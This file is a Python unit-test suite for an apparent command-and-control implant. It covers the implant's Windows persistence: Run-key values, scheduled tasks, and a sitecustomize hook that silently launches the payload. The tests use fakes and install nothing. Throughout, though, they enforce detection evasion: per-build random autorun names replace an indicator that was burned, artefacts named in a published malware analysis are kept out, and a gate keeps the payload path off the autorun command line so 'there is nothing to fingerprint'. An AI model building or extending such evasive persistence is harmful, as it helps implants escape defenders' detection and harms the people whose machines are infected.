#!/usr/bin/env python3
"""
Unit tests for per-build persistence names and for the interpreter-level
startup hook that lets an autorun entry carry no payload path.

Five things these tests are careful about.

**Nothing here installs persistence.** This runs on developer workstations
and, for the Windows leg of this plan, on a real Windows host, so no test
may touch a real `Run` key or a real scheduled task even with a cleanup
afterwards. The Windows branches are driven through two seams: a fake
`winreg` object put into `sys.modules`, which shadows the real module even
where there is one, and a replacement for `subprocess.run` that records
the `schtasks` argv it was handed. `platform.system` is patched so the
branches are reachable at all.

**The install and the removal are compared against each other, not
against a literal.** `_exec_persist` and `_exec_unpersist` used to carry
their own copy of one hardcoded name, which is this repository's most
frequent defect. A test that asserts each writes the name the test chose
would pass just as well against two copies of it. So the strong tests
install through the beacon, read back what landed, remove through the same
beacon, and require the registry and the task list to be empty again --
whatever the name was.

**The rendered hook is compiled, never executed.** It ends in
`runpy.run_path` on the payload, so executing it in this process would
start a beacon that never returns. `compile()` proves the text is valid
Python; nothing here runs it, in any test.

**The burned name has exactly one home.** `SystemHealthMonitor` was
shipped as both the `Run` value and the task name in every deployment.
`_BURNED_NAME` below is the only place in `software/` it may still appear,
and `test_the_burned_name_is_in_no_source_file` is what keeps that true.

**Two builds are compared through the generator routes, not through the
helper that builds the block.** `api_beacon_gen` and `api_beacon_gist`
assemble one `gen_cfg` between them now, and `_GeneratorCase` from
`test_tunnel_config` is reused rather than copied so there is one
unwrapper for the delivered artifact's shape.
"""

import base64
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from software.c2 import beacon as beacon_mod
from software.c2.beacon import Beacon, persistence_name
from software.c2.stagers.startup_hook import render_sitecustomize
from software.tests.test_tunnel_config import _GeneratorCase

_REPO = Path(__file__).resolve().parent.parent.parent

# The name that used to be written in every deployment. This file is the
# only place in the tree it may appear, and
# `test_the_burned_name_and_the_write_ups_are_in_no_shipped_file` is what
# proves that.
_BURNED_NAME = "SystemHealthMonitor"

# What the published write-up names: the original's layout directory, and
# the extension it gave its payload. Carrying either would ship us an
# indicator somebody else's detection content already holds.
#
# They are gated differently, because only one of them can be. The
# directory is a literal nothing legitimate contains, so it is walked
# over the whole tree. The extension is not: `beacon.py` loads libcrypto
# by file name and classifies loot by extension, and `agent/safety.py`
# matches on `comsvcs.dll`, all of which predate this work and are
# nothing to do with a payload name. So `.dll` is gated where it would
# be an indicator of ours -- the rendered hook, the names the generator
# mints, and every file in the package that renders text onto a target.
_WRITE_UP_DIR = "cp49s"
_WRITE_UP_PAYLOAD_EXT = ".dll"
_WRITE_UP_ARTEFACTS = (_WRITE_UP_DIR, _WRITE_UP_PAYLOAD_EXT)

# Everything in the tree is a deliverable except the material that exists
# to *discuss* the work: the plan and the design spec, which quote the
# write-up's artefacts deliberately, this plan's briefs, reports and
# review diffs, and this file, which asserts their absence and so has to
# name them. Binary suffixes are skipped because a substring gate over a
# PNG proves nothing and costs 60 MB of reads.
#
# The list is taken from `git ls-files`, so a file `.gitignore` names is
# not read at all. That is not tidiness: `.gitignore` carries
# `.history/`, which is VS Code's Local History, and a developer who had
# edited `beacon.py` before the burned name was removed from it carries a
# pre-fix copy there -- making this test assert that the branch ships a
# burned indicator, on the branch's own central safety claim. `.venv/`,
# `build/`, `dist/`, `logs/`, `captures/` and `.openchamber/` are the
# same class of false alarm, and `vendor/` stops being read along with
# them. The walk is kept as a fallback for a tree that is not a checkout.
_LEAK_SKIP_DIRS = frozenset({".git", "__pycache__", ".superpowers",
                             ".worktrees", "node_modules"})
_LEAK_SKIP_SUFFIXES = frozenset({
    ".png", ".jpg", ".jpeg", ".gif", ".ico", ".pdf", ".zip", ".gz",
    ".pcap", ".pcapng", ".woff", ".woff2", ".ttf", ".mp4", ".webm",
    ".step", ".stl", ".pyc",
})
_LEAK_SKIP_PREFIXES = (os.path.join("docs", "superpowers"),)


def _tracked_files(root):
    """Every path `git ls-files` reports, or None outside a checkout."""
    try:
        listed = subprocess.run(
            ["git", "-C", str(root), "ls-files", "-z"],
            capture_output=True, timeout=60)
    except (OSError, subprocess.SubprocessError):
        return None
    if listed.returncode != 0:
        return None
    names = [name for name in listed.stdout.decode("utf-8", "replace").split("\0")
             if name]
    return names or None


def _walked_files(root):
    """Every path under the tree, for a copy that is not a git checkout."""
    names = []
    for path in sorted(Path(root).rglob("*")):
        if not path.is_file():
            continue
        relative = str(path.relative_to(root))
        if any(part in _LEAK_SKIP_DIRS for part in Path(relative).parts):
            continue
        names.append(relative)
    return names


def _shipped_files(root=_REPO):
    """Every text file in the tree that is shipped rather than discussed.

    `root` is a parameter so the selection itself can be tested against a
    tree a test owns, rather than only against this checkout.
    """
    here = Path(__file__).resolve()
    names = _tracked_files(root)
    if names is None:
        names = _walked_files(root)
    for relative in sorted(names):
        path = Path(root) / relative
        # A tracked path can be absent in a sparse or mid-rebase tree,
        # and a submodule entry is a directory.
        if not path.is_file() or path.resolve() == here:
            continue
        if relative.startswith(_LEAK_SKIP_PREFIXES):
            continue
        if path.suffix.lower() in _LEAK_SKIP_SUFFIXES:
            continue
        yield relative, path.read_text(encoding="utf-8", errors="ignore")


# A plausible generated name, of the shape the server mints. Written here
# rather than taken from the generator so a generator that stopped
# generating could not make these tests agree with it.
_BUILD_NAME = "DeviceBroker4f2a"
_PAYLOAD_NAME = "runtime9c21.py"


def _make_config(persistence=None):
    """A beacon config with no transport enabled, optionally with a block."""
    c2 = {
        "beacon_interval_seconds": 10,
        "jitter_percent": 20,
        "encryption_key": base64.b64encode(os.urandom(32)).decode("ascii"),
        "proxy": {"mode": "none"},
        "https": {"enabled": False, "callback_url": "", "verify_ssl": False},
        "dns": {"enabled": False},
    }
    if persistence is not None:
        c2["persistence"] = persistence
    return {"c2": c2}


def _block(**overrides):
    """The `persistence` block a generated build carries."""
    block = {"name": _BUILD_NAME, "base_dir": "support4f2a",
             "payload_name": _PAYLOAD_NAME, "gate": "path"}
    block.update(overrides)
    return block


class _FakeWinreg(object):
    """Enough of `winreg` for the two Run-key branches, and no registry.

    Put into `sys.modules` so the `import winreg` inside `_exec_persist`
    finds this instead of the real module -- which is what makes these
    tests safe on a Windows host as well as on one with no registry at
    all.
    """

    HKEY_CURRENT_USER = "HKCU"
    KEY_SET_VALUE = 0x0002
    REG_SZ = 1

    def __init__(self, values=None):
        self.values = dict(values or {})
        self.opened = []
        self.closed = 0

    def OpenKey(self, root, path, reserved, access):
        self.opened.append((root, path, access))
        return (root, path)

    def SetValueEx(self, key, name, reserved, kind, value):
        assert kind == self.REG_SZ, kind
        self.values[name] = value

    def DeleteValue(self, key, name):
        if name not in self.values:
            raise FileNotFoundError(name)
        del self.values[name]

    def CloseKey(self, key):
        self.closed += 1


class _FakeSchtasks(object):
    """A `subprocess.run` that keeps a task list and runs nothing."""

    def __init__(self):
        self.tasks = {}
        self.calls = []

    def __call__(self, args, **kwargs):
        args = list(args)
        self.calls.append(args)
        if args[0] != "schtasks":
            raise AssertionError("unexpected command: %r" % (args,))
        name = args[args.index("/tn") + 1]
        if "/create" in args:
            self.tasks[name] = args[args.index("/tr") + 1]
            return subprocess.CompletedProcess(args, 0, "SUCCESS: created", "")
        if "/delete" in args:
            if name not in self.tasks:
                return subprocess.CompletedProcess(
                    args, 1, "", "ERROR: the task does not exist")
            del self.tasks[name]
            return subprocess.CompletedProcess(args, 0, "SUCCESS: deleted", "")
        raise AssertionError("unexpected schtasks call: %r" % (args,))


class _PersistenceCase(unittest.TestCase):
    """A beacon, a fake registry and a fake task scheduler."""

    def beacon(self, persistence=None):
        return Beacon(_make_config(persistence))

    def windows(self):
        return mock.patch.object(beacon_mod.platform, "system",
                                 return_value="Windows")

    def registry(self, values=None):
        fake = _FakeWinreg(values)
        patch = mock.patch.dict(sys.modules, {"winreg": fake})
        patch.start()
        self.addCleanup(patch.stop)
        return fake

    def schtasks(self):
        fake = _FakeSchtasks()
        patch = mock.patch.object(beacon_mod.subprocess, "run", fake)
        patch.start()
        self.addCleanup(patch.stop)
        return fake

    def bundle(self, payload_name=_PAYLOAD_NAME, payload=True):
        """A brought-interpreter layout, and `sys.executable` inside it.

        Returns the directory. The hook would sit in its `Lib/`; what
        matters to the beacon is that the payload is beside the
        interpreter, which is how it knows the hook can find it.
        """
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        exe = Path(tmp.name, "pythonw.exe")
        exe.write_text("")
        if payload:
            Path(tmp.name, payload_name).write_text("")
        patch = mock.patch.object(beacon_mod.sys, "executable", str(exe))
        patch.start()
        self.addCleanup(patch.stop)
        return tmp.name


class TestTheAutorunNameComesFromTheBuild(_PersistenceCase):
    """One name per build, read from the config block by both methods."""

    def test_persist_uses_the_generated_name_not_SystemHealthMonitor(self):
        with self.windows():
            registry = self.registry()
            tasks = self.schtasks()
            run = self.beacon(_block())._exec_persist("registry")
            task_out = self.beacon(_block())._exec_persist("schtask")

        self.assertEqual(list(registry.values), [_BUILD_NAME],
                         "the Run value is not the build's name")
        self.assertEqual(list(tasks.tasks), [_BUILD_NAME],
                         "the scheduled task is not the build's name")
        for output in (run, task_out):
            self.assertNotIn("[error]", output, output)
            self.assertNotIn(_BURNED_NAME, output)
        self.assertNotIn(_BURNED_NAME, "".join(registry.values))
        self.assertNotIn(_BURNED_NAME, "".join(tasks.tasks))

    def test_unpersist_removes_the_same_generated_name(self):
        # Install, read back what landed, remove, and require nothing to
        # be left -- without the test naming the value. Two copies of one
        # literal would pass a test that named it.
        with self.windows():
            registry = self.registry()
            tasks = self.schtasks()
            beacon = self.beacon(_block())

            beacon._exec_persist("registry")
            beacon._exec_persist("schtask")
            installed = (dict(registry.values), dict(tasks.tasks))

            removed = (beacon._exec_unpersist("registry"),
                       beacon._exec_unpersist("schtask"))

        self.assertEqual(len(installed[0]), 1, installed)
        self.assertEqual(len(installed[1]), 1, installed)
        self.assertEqual(registry.values, {},
                         "unpersist removed a different Run value from the "
                         "one persist wrote")
        self.assertEqual(tasks.tasks, {},
                         "unpersist removed a different task from the one "
                         "persist created")
        for output in removed:
            self.assertNotIn("[error]", output, output)

    def test_an_artifact_without_a_persistence_block_keeps_todays_behaviour(self):
        # No block: a config file rather than a generated build. It still
        # installs, it still names the payload on the command line, and
        # the same artifact still takes it back out again.
        with self.windows():
            registry = self.registry()
            beacon = self.beacon()

            beacon._exec_persist("registry")
            installed = dict(registry.values)
            beacon._exec_unpersist("registry")

        self.assertEqual(len(installed), 1, installed)
        name, cmd_line = list(installed.items())[0]
        self.assertTrue(name, "no Run value was written at all")
        self.assertNotIn(_BURNED_NAME, name)
        self.assertIn(os.path.abspath(sys.argv[0]), cmd_line,
                      "the entry no longer names the running payload")
        self.assertEqual(registry.values, {})

    def test_a_name_without_a_block_is_stable_across_two_instances(self):
        # Two runs of one artifact on one host must agree, or an install
        # from the first could not be removed by the second.
        first = self.beacon()._persist_name
        second = self.beacon()._persist_name
        self.assertEqual(first, second)
        self.assertTrue(first)

    def test_the_leak_walk_reads_tracked_files_and_not_ignored_ones(self):
        # The selection, against a tree this test owns. `.gitignore`
        # names `.history/`, which is VS Code's Local History: a
        # developer who edited `beacon.py` before the burned name came
        # out of it carries a pre-fix copy there, and a walk that read it
        # would make the test above assert that this branch ships a
        # burned indicator -- the most alarming possible false alarm, on
        # this branch's own central safety claim.
        with tempfile.TemporaryDirectory() as root:
            tree = Path(root)
            (tree / ".gitignore").write_text(".history/\n", encoding="utf-8")
            (tree / "shipped.md").write_text("ordinary text\n",
                                             encoding="utf-8")
            history = tree / ".history"
            history.mkdir()
            (history / "beacon.py").write_text(
                "value = %r\n" % (_BURNED_NAME,), encoding="utf-8")

            # Not a checkout yet: the fallback reads everything, which is
            # what makes the assertion after `git add` mean something.
            walked = dict(_shipped_files(root=tree))
            self.assertIn(".history/beacon.py",
                          [name.replace(os.sep, "/") for name in walked])

            for argv in (["git", "init", "-q"],
                         ["git", "add", ".gitignore", "shipped.md"]):
                done = subprocess.run(argv, cwd=str(tree),
                                      capture_output=True)
                self.assertEqual(done.returncode, 0, done.stderr[:200])

            tracked = dict(_shipped_files(root=tree))
            self.assertEqual(sorted(tracked), [".gitignore", "shipped.md"])
            for name, text in tracked.items():
                self.assertNotIn(_BURNED_NAME, text, name)

    def test_the_burned_name_and_the_write_ups_are_in_no_shipped_file(self):
        # Past `software/` and past `*.py`: the generator ships comments
        # verbatim into the delivered artifact, and a stager template or
        # a doc is as easy a place to paste one of these as a module.
        offenders = []
        for relative, text in _shipped_files():
            for literal in (_BURNED_NAME, _WRITE_UP_DIR):
                if literal in text:
                    offenders.append("%s: %s" % (relative, literal))
        self.assertEqual(offenders, [],
                         "a name that was shipped in every deployment, or "
                         "one the published analysis already names, is in "
                         "the tree")

    def test_the_stager_package_names_no_payload_of_the_write_ups_kind(self):
        # Where `.dll` *would* be an indicator of ours: the package whose
        # text is rendered onto a target.
        offenders = []
        for path in sorted((_REPO / "software" / "c2" / "stagers").rglob("*")):
            if not path.is_file() or path.suffix.lower() in _LEAK_SKIP_SUFFIXES:
                continue
            if _WRITE_UP_PAYLOAD_EXT in path.read_text(encoding="utf-8",
                                                       errors="ignore"):
                offenders.append(str(path.relative_to(_REPO)))
        self.assertEqual(offenders, [],
                         "the stager package names a payload with the "
                         "extension the published analysis names")


class TestWhatTheEntrysCommandLineCarries(_PersistenceCase):
    """Whether the payload's path is on the command line, and when."""

    def test_the_path_gate_names_the_payload_beside_the_interpreter(self):
        base = self.bundle()
        beacon = self.beacon(_block(gate="path"))
        self.assertEqual(beacon._get_beacon_path(),
                         os.path.join(base, _PAYLOAD_NAME))

        with self.windows():
            registry = self.registry()
            beacon._exec_persist("registry")
        cmd_line = list(registry.values.values())[0]
        self.assertIn(os.path.join(base, _PAYLOAD_NAME), cmd_line)

    def test_the_argc_gate_puts_no_payload_path_on_the_command_line(self):
        self.bundle()
        beacon = self.beacon(_block(gate="argc"))
        self.assertEqual(beacon._get_beacon_path(), "")

        with self.windows():
            registry = self.registry()
            tasks = self.schtasks()
            beacon._exec_persist("registry")
            beacon._exec_persist("schtask")

        self.assertEqual(list(registry.values.values()), [sys.executable],
                         "the Run value still names a payload")
        self.assertEqual(list(tasks.tasks.values()), [sys.executable],
                         "the scheduled task still names a payload")
        self.assertNotIn(_PAYLOAD_NAME, " ".join(
            " ".join(call) for call in tasks.calls))

    def test_the_argc_gate_has_no_effect_without_a_brought_interpreter(self):
        # No payload beside this interpreter means no hook in its Lib/,
        # so dropping the path would install an entry that starts an
        # interpreter and nothing else.
        self.bundle(payload=False)
        beacon = self.beacon(_block(gate="argc"))
        self.assertEqual(beacon._get_beacon_path(),
                         os.path.abspath(sys.argv[0]))

        with self.windows():
            registry = self.registry()
            beacon._exec_persist("registry")
        self.assertIn(os.path.abspath(sys.argv[0]),
                      list(registry.values.values())[0])

    def test_an_unknown_gate_is_treated_as_path(self):
        self.bundle()
        beacon = self.beacon(_block(gate="whatever"))
        self.assertEqual(beacon._persist_gate, "path")
        self.assertTrue(beacon._get_beacon_path())


class TestTheGeneratorMintsThem(_GeneratorCase):
    """What the two generator routes bake into a build."""

    _persistence = None

    def request_body(self, tunnel=None):
        body = super().request_body(tunnel)
        if self._persistence is not None:
            body["persistence"] = self._persistence
        return body

    def test_two_builds_get_different_persistence_names(self):
        first = self.generate("gen")[1]["persistence"]
        second = self.generate("gist")[1]["persistence"]

        for block in (first, second):
            for field in ("name", "base_dir", "payload_name", "gate"):
                self.assertIn(field, block, block)
            self.assertTrue(block["name"])
        self.assertNotEqual(first["name"], second["name"])
        self.assertNotEqual(first["base_dir"], second["base_dir"])
        self.assertNotEqual(first["payload_name"], second["payload_name"])

    def test_a_build_that_asks_for_nothing_gets_the_path_gate(self):
        for route in ("gen", "gist"):
            with self.subTest(route=route):
                block = self.generate(route)[1]["persistence"]
                self.assertEqual(block["gate"], "path")

    def test_a_build_may_ask_for_the_argc_gate(self):
        self._persistence = {"gate": "argc"}
        for route in ("gen", "gist"):
            with self.subTest(route=route):
                self.assertEqual(
                    self.generate(route)[1]["persistence"]["gate"], "argc")

    def test_a_gate_nobody_implements_is_refused_rather_than_baked(self):
        self._persistence = {"gate": "sideload"}
        block = self.generate("gen")[1]["persistence"]
        self.assertEqual(block["gate"], "path")

    def test_the_baked_names_are_not_the_write_ups(self):
        block = self.generate("gen")[1]["persistence"]
        flat = " ".join(str(value) for value in block.values())
        for artefact in _WRITE_UP_ARTEFACTS:
            self.assertNotIn(artefact, flat, flat)
        self.assertTrue(block["payload_name"].endswith(".py"),
                        block["payload_name"])

    def test_the_build_installs_under_the_name_it_was_given(self):
        # The generator's block, through the beacon that receives it: the
        # two halves are only worth anything together.
        block = self.generate("gen")[1]["persistence"]
        beacon = Beacon(_make_config(block))
        fake = _FakeWinreg()
        with mock.patch.object(beacon_mod.platform, "system",
                               return_value="Windows"), \
                mock.patch.dict(sys.modules, {"winreg": fake}):
            beacon._exec_persist("registry")
        self.assertEqual(list(fake.values), [block["name"]])


class TestTheGeneratedName(unittest.TestCase):
    """`persistence_name`, which both producers of a name go through."""

    def test_the_same_entropy_gives_the_same_name(self):
        entropy = bytes([3, 5, 0x4f, 0x2a])
        self.assertEqual(persistence_name(entropy),
                         persistence_name(entropy))

    def test_different_entropy_usually_gives_a_different_name(self):
        names = {persistence_name(os.urandom(4)) for _ in range(200)}
        self.assertGreater(len(names), 150, names)

    def test_a_name_is_a_plain_windows_value_name(self):
        for _ in range(50):
            name = persistence_name(os.urandom(4))
            self.assertRegex(name, r"^[A-Za-z][A-Za-z0-9]{4,31}$")

    def test_too_little_entropy_is_refused(self):
        with self.assertRaises(ValueError):
            persistence_name(b"abc")


class TestTheStartupHook(unittest.TestCase):
    """`render_sitecustomize`, which the interpreter bundle carries."""

    def test_sitecustomize_for_the_path_gate_has_no_argc_check(self):
        text = render_sitecustomize(_PAYLOAD_NAME)
        self.assertNotIn("Py_GetArgcArgv", text)
        self.assertNotIn("ctypes", text)
        self.assertIn(_PAYLOAD_NAME, text)
        self.assertIn("run_path", text)

    def test_sitecustomize_for_the_argc_gate_calls_Py_GetArgcArgv(self):
        text = render_sitecustomize(_PAYLOAD_NAME, "argc")
        self.assertIn("ctypes.pythonapi.Py_GetArgcArgv", text)
        self.assertRegex(text, r"\.value\s*==\s*1",
                         "the hook does not act on the number it read")
        self.assertIn(_PAYLOAD_NAME, text)
        self.assertIn("run_path", text)

    def test_the_default_gate_is_path(self):
        self.assertEqual(render_sitecustomize(_PAYLOAD_NAME),
                         render_sitecustomize(_PAYLOAD_NAME, "path"))
        # The reason, not the word. A docstring that still said which
        # gate was the default but had lost why would pass a test that
        # looked for "default" -- and losing the why is exactly how the
        # next reader comes to flip it.
        doc = render_sitecustomize.__doc__ or ""
        self.assertIn("unravelled", doc,
                      "the docstring no longer says that the argc shape "
                      "is what the published analysis followed")
        self.assertIn("not an improvement", doc,
                      "the docstring no longer tells the next reader that "
                      "flipping the default is not a fix")

    def test_rendered_sitecustomize_compiles(self):
        # compile(), never exec(): the hook ends in `runpy.run_path` on
        # the payload, so executing it here would start a beacon.
        for gate in ("path", "argc"):
            with self.subTest(gate=gate):
                text = render_sitecustomize(_PAYLOAD_NAME, gate)
                compile(text, "<sitecustomize>", "exec")

    def test_the_rendered_hook_names_no_literal_from_the_write_up(self):
        for gate in ("path", "argc"):
            text = render_sitecustomize(_PAYLOAD_NAME, gate)
            for artefact in _WRITE_UP_ARTEFACTS:
                self.assertNotIn(artefact, text, gate)
            # No absolute location either: the hook finds the payload
            # from its own position, so there is nothing to fingerprint.
            for absolute in (":\\", "%LOCALAPPDATA%", "AppData", "/opt/"):
                self.assertNotIn(absolute, text, gate)

    def test_the_hook_finds_the_payload_beside_the_interpreter(self):
        text = render_sitecustomize(_PAYLOAD_NAME)
        # Lib/sitecustomize.py -> the interpreter root is two levels up.
        self.assertEqual(text.count("os.path.dirname"), 2, text)
        self.assertIn("__file__", text)

    def test_a_gate_nobody_implements_is_refused(self):
        with self.assertRaises(ValueError):
            render_sitecustomize(_PAYLOAD_NAME, "sideload")

    def test_a_payload_name_that_is_not_a_plain_filename_is_refused(self):
        for bad in ("", "../escape.py", "sub/dir.py", "quote'.py"):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    render_sitecustomize(bad)

    def test_the_hook_does_not_arm_a_second_time_in_a_child(self):
        # The payload starts `python -` children with this same
        # interpreter, and a hook that armed in them would run the
        # payload instead of the source on stdin -- for ever.
        text = render_sitecustomize(_PAYLOAD_NAME)
        self.assertIn("environ", text)
        marker = _PAYLOAD_NAME.split(".")[0].upper()
        self.assertIn(marker, text,
                      "the guard is not derived from this build's payload "
                      "name, so every deployment would share one marker")
        # And the derivation is real rather than this build's marker
        # written into the renderer: another build gets another marker.
        self.assertNotIn(marker, render_sitecustomize("other1234.py"),
                         "one marker is hardcoded for every build")


if __name__ == "__main__":
    unittest.main()
